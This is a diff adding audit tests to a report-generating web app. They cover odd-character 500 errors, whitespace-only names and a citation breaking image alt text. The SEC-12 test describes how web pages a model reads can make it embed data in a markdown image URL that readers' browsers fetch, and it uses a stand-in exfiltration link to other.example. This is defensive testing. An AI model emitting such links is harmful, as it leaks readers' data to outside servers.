@@ -1658,3 +1658,97 @@ def test_bug53_a_search_service_that_cannot_be_reached_counts_as_refusing():
     rm = SearXNG(searxng_api_url="http://127.0.0.1:1/search")  # nothing listens on port 1
     assert rm.forward("sleep and memory") == []
     assert rm.refused >= 1, "the failed search was not counted, so the Run cannot say the service was down"
+
+
+# --- Task 7: limits and odd inputs -----------------------------------------------------------
+
+NUL = "\u0000"
+LONE_SURROGATE = "\ud800"  # legal in a JSON string ("\ud800"), but not in UTF-8
+
+
+def _answered(call):
+    """(status, None) for a response; (None, error) when the app raised instead of answering with 422
+    (a TestClient re-raises the 500 the real server would send)."""
+    try:
+        return call().status_code, None
+    except Exception as error:  # noqa: BLE001
+        return None, f"{type(error).__name__}: {str(error)[:80]}"
+
+
+@finding("BUG-54")
+@pytest.mark.db
+@pytest.mark.parametrize("bad", [NUL, LONE_SURROGATE], ids=["nul", "lone-surrogate"])
+def test_bug54_a_character_the_database_cannot_hold_is_refused_not_a_500(admin, browser, configured, bad):
+    """A NUL or a lone surrogate passes every length check and then breaks the INSERT (Postgres text
+    cannot hold NUL; UTF-8 cannot encode a surrogate): the User gets a 500, from the topic, a Project's
+    name, request_key, a section, a refinement answer, or a Project's search_scope / writing_style.
+    Live on the audit stack: POST /sessions and POST /projects, all 500 "Internal Server Error"."""
+    user = make_user(admin, browser, "audit-odd@example.org")
+    project = user.post("/api/projects", json={"name": "P"}).json()
+    base = {"language": "th", "topic": "a valid topic"}
+    attempts = {
+        "topic": lambda: user.post("/api/sessions", json={**base, "topic": f"ab{bad}cd"}),
+        "project name": lambda: user.post("/api/projects", json={"name": f"a{bad}b"}),
+        "request_key": lambda: user.post("/api/sessions", json={**base, "request_key": f"k{bad}"}),
+        "section": lambda: user.post("/api/sessions", json={**base, "sections": [f"a{bad}b"]}),
+        "refinement": lambda: user.post("/api/sessions", json={**base, "refinement": [{"question": "q", "answer": f"a{bad}"}]}),
+        "search_scope": lambda: user.patch(f"/api/projects/{project['id']}", json={"search_scope": f"a{bad}"}),
+    }
+    broke = {}
+    for name, call in attempts.items():
+        status, error = _answered(call)
+        if error or (status is not None and status >= 500):
+            broke[name] = error or status
+    assert not broke, f"answered with a 500 instead of 422: {broke}"
+
+
+@finding("BUG-55")
+@pytest.mark.db
+def test_bug55_a_topic_of_only_spaces_is_refused(admin, browser, configured, db):
+    """min_length=3 counts the spaces; the topic is stripped afterwards. "     " is accepted, stored as
+    "", takes a quota unit and a Worker slot, and the Run is started with no topic (live on the audit stack:
+    queued, running ~10 s, failed empty_report, the Session titled ""). The page's own check is
+    topic.strip().length >= 3, so only the API, MCP and integration tokens get through."""
+    user = make_user(admin, browser, "audit-odd@example.org")
+    for blank in ("     ", "\n\n\n", "\t\t\t"):
+        r = user.post("/api/sessions", json={"language": "th", "topic": blank})
+        assert r.status_code == 422, f"{blank!r}: {r.status_code}"
+
+
+@finding("BUG-56")
+@pytest.mark.db
+def test_bug56_a_project_named_with_only_spaces_is_refused(admin, browser):
+    """Same gap on ProjectIn.name / ProjectPatch.name (min_length=1 before strip()): a Project with
+    an empty name, shown as a card with no title; renaming one to "   " also works."""
+    user = make_user(admin, browser, "audit-odd@example.org")
+    assert user.post("/api/projects", json={"name": "   "}).status_code == 422
+    project = user.post("/api/projects", json={"name": "P"}).json()
+    assert user.patch(f"/api/projects/{project['id']}", json={"name": "   "}).status_code == 422
+
+
+@finding("BUG-57")
+def test_bug57_a_citation_in_an_images_alt_text_does_not_break_the_tag():
+    """CITATION.sub runs over the rendered HTML, so [1] inside ![alt [1]](url) is replaced by an <a> with
+    double quotes in the middle of alt="...": the img tag ends early (live: the interactive export has
+    <img src="https://example.org/a.png" alt="t <a class="cite" href="#src-1">...)."""
+    from litstorm.render import html
+
+    report = {"schema": 1, "engine": "storm", "title": "T", "language": "en", "lead": "![t [1] x](https://example.org/a.png)",
+              "sections": [], "sources": [{"id": 1, "url": "https://a.example/x", "title": "A", "description": "", "evidence": []}]}
+    page = html.render(report)
+    assert not re.search(r'alt="[^"]*<a class=', page), "the citation's markup landed inside the alt attribute"
+
+
+@finding("SEC-12")
+def test_sec12_a_report_cannot_make_the_readers_browser_fetch_an_outside_image():
+    """The report body is markdown from a model that has read web pages: ![](https://other.example/?q=...) becomes
+    <img src="https://other.example/..."> in the HTML export (no CSP in that file) and on the web report page (no
+    CSP either, SEC-09), so opening a report sends a request, with whatever the page made the model put in
+    the URL, to a server the reader never chose. Live: Edge on the audit stack requested https://example.org/a.png
+    when the report page and the saved HTML export were opened. (The interactive and brief pages are safe: img-src data:.)"""
+    from litstorm.render import html
+
+    report = {"schema": 1, "engine": "storm", "title": "T", "language": "en", "lead": "![x](https://other.example/a.png?q=secret)",
+              "sections": [], "sources": []}
+    page = html.render(report)
+    assert "https://other.example/a.png" not in page or "<img" not in page
